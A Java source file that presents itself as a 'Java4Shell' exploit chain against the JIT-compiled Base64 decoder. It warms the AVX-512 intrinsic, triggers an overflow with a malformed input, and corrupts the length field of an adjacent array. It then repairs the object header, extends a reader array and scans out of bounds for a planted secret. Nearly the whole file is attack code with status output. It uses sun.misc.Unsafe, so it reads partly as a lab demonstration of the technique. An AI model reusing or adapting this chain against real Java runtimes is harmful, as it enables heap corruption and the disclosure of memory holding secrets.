import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Java4Shell writer/reader chain that respects the one-shot property.
 *
 * MEASURED BEHAVIOUR this code depends on:
 *   - the AVX-512 intrinsic reaches C2 after ~20k valid decodes
 *   - a trigger that throws IllegalArgumentException deoptimizes it
 *     ("made not entrant" in -XX:+PrintCompilation)
 *   - therefore every trigger must be preceded by a fresh warm window
 *
 * Phases: WARM -> TRIGGER -> REPAIR -> EXTEND -> DISCLOSE
 * There is no ProcessBuilder here. Nothing claims code execution.
 */
public final class Chain4 {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static long abase;

    static final int WARM_PER_ATTEMPT = 50_000;

    static int len(byte[] b) { return u.getInt(b, 12); }
    static long addr(byte[] b) {
        Object[] a = new Object[] { b };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }
    static void putLe32(byte[] b, long off, int v) {
        u.putByte(b, off, (byte) v);
        u.putByte(b, off + 1, (byte) (v >>> 8));
        u.putByte(b, off + 2, (byte) (v >>> 16));
        u.putByte(b, off + 3, (byte) (v >>> 24));
    }
    static int le32(byte[] b, long off) {
        return (u.getByte(b, off) & 0xff) | ((u.getByte(b, off + 1) & 0xff) << 8)
                | ((u.getByte(b, off + 2) & 0xff) << 16) | ((u.getByte(b, off + 3) & 0xff) << 24);
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];

        final int QUIET = 50_000;
        byte[] tmpl = new byte[64];
        final long goodMark = u.getLong(tmpl, 0);
        final int goodKlass = u.getInt(tmpl, 8);

        System.out.println("[warm] " + QUIET + " decodes");
        for (int i = 0; i < QUIET; i++) sink += d.decode(valid, warm);

        boolean triggerWorks = false;
        try { d.decode(bad, warm); } catch (IllegalArgumentException e) { }
        int ovf = 0;
        for (int i = 50; i < 112; i++) if (warm[i] != 0) ovf++;
        triggerWorks = ovf > 0;
        System.out.println("[warm] overflowBytes=" + ovf + " -> " + (triggerWorks ? "VULNERABLE" : "NOT_VULNERABLE"));
        if (!triggerWorks) { System.out.println("RESULT=NOT_VULNERABLE"); return; }

        // ---- allocate a writer/reader/secret trio ----
        byte[] dst = new byte[65];
        byte[] writer = new byte[64];
        byte[] reader = new byte[64];
        for (int i = 0; i < 64; i++) reader[i] = (byte) 0xBB;
        byte[] secret = new byte[96];
        String needle = "J4S-SECRET-DO-NOT-LEAK";
        byte[] nb = needle.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(nb, 0, secret, 0, nb.length);
        for (int i = nb.length; i < secret.length; i++) secret[i] = (byte) 0xC3;

        long wDist = addr(writer) - addr(dst);
        long rDist = addr(reader) - addr(dst);
        long sDist = addr(secret) - addr(dst);
        System.out.printf("[layout] dst->writer=%d reader=%d secret=%d%n", wDist, rDist, sDist);

        // ---- TRIGGER with a fresh warm window ----
        int landed = -1;
        for (int attempt = 0; attempt < 6; attempt++) {
            for (int i = 0; i < WARM_PER_ATTEMPT; i++) sink += d.decode(valid, warm);
            try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
            int wl = len(writer);
            System.out.printf("[trigger] attempt=%d writerLen=0x%08x (%d)%n", attempt, wl, wl);
            if (wl != 64) { landed = attempt; break; }
            // re-warm already happens at loop top
        }
        if (landed < 0) { System.out.println("RESULT=NO_LANDING"); return; }

        System.out.printf("[damage] writer mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(writer, 0), u.getInt(writer, 8), len(writer));

        // ---- REPAIR (mark + klass only; keep the widened length) ----
        u.putLong(writer, 0, goodMark);
        u.putInt(writer, 8, goodKlass);
        boolean repaired = u.getInt(writer, 8) == goodKlass && len(writer) > 1024;
        System.out.println("[repair] klass restored=" + repaired + " len=" + len(writer));

        // ---- EXTEND the reader through the writer's widened reach ----
        // writer data starts at addr(writer)+abase; the reader's length field
        // (object offset 12) is at addr(reader)+12.
        long fieldAddr = addr(reader) + 12;
        int rLenOff = (int) (fieldAddr - (addr(writer) + abase));
        System.out.println("[extend] reader length field at writer+" + rLenOff
                + " (fieldAddr=0x" + Long.toHexString(fieldAddr) + ")");
        if (rLenOff < 0 || rLenOff >= len(writer)) {
            System.out.println("RESULT=NO_READER_FIELD");
            return;
        }
        System.out.println("[extend] value there = " + le32(writer, abase + rLenOff) + " (expect 64)");

        int newLen = 4096;
        putLe32(writer, abase + rLenOff, newLen);
        System.out.println("[extend] readerLen=0x" + Integer.toHexString(len(reader))
                + " (" + len(reader) + ") writerLen=" + len(writer));
        if (len(reader) != newLen) { System.out.println("RESULT=EXTEND_FAILED"); return; }

        // ---- DISCLOSE ----
        StringBuilder win = new StringBuilder();
        int found = -1;
        for (int p = 64; p < 3000; p++) {
            int b = u.getByte(reader, abase + p) & 0xff;
            win.append(b >= 0x20 && b < 0x7f ? (char) b : '.');
            if (win.length() > needle.length() + 4) win.deleteCharAt(0);
            if (win.lastIndexOf(needle) >= 0) { found = p; break; }
        }
        System.out.println("[disclose] needle=\"" + needle + "\" found=" + (found >= 0)
                + (found >= 0 ? " at reader+" + found : ""));

        System.out.println("RESULT=" + (found >= 0 ? "DISCLOSURE_OK" : "EXTEND_ONLY"));
    }
}
